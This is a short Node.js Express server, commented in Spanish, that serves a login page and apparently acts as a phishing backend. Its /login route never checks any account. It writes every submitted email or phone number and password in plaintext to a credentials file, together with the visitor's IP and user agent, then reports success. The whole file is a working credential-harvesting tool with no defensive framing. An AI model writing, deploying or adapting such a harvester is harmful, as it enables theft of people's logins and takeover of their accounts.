const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(__dirname)); // Servir archivos estáticos

// Ruta para manejar el inicio de sesión
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    
    // Validar que los campos no estén vacíos
    if (!email || !password) {
        return res.status(400).json({ 
            success: false, 
            message: 'Los campos de correo y contraseña son obligatorios.' 
        });
    }
    
    // Validar formato de email o teléfono
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^[\+]?[1-9][\d]{0,15}$/;
    
    if (!emailRegex.test(email) && !phoneRegex.test(email.replace(/\s/g, ''))) {
        return res.status(400).json({ 
            success: false, 
            message: 'Por favor ingresa un correo electrónico o número de teléfono válido.' 
        });
    }
    
    // Crear directorio de datos si no existe
    const dataDir = path.join(__dirname, 'data');
    if (!fs.existsSync(dataDir)) {
        fs.mkdirSync(dataDir, { recursive: true });
    }
    
    // Escribir las credenciales en un archivo de texto
    const filePath = path.join(dataDir, 'credenciales.txt');
    const time = new Date().toISOString();
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    const data =
        `[${time}] IP: ${ip} - User Agent: ${userAgent}\n` +
        `Correo/Tel: ${email}\n` +
        `Contraseña: ${password}\n` +
        '----------------------------------------\n\n';
    
    // Guardar en el archivo
    fs.appendFile(filePath, data, (err) => {
        if (err) {
            console.error('Error al guardar las credenciales:', err);
            return res.status(500).json({ 
                success: false, 
                message: 'Error interno del servidor al guardar la información.' 
            });
        }
        
        console.log('Credenciales guardadas correctamente desde la IP:', ip);
        res.json({ success: true });
    });
});

// Ruta principal - servir el index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Iniciar servidor
app.listen(PORT, () => {
    console.log(`Servidor ejecutándose en http://localhost:${PORT}`);
});
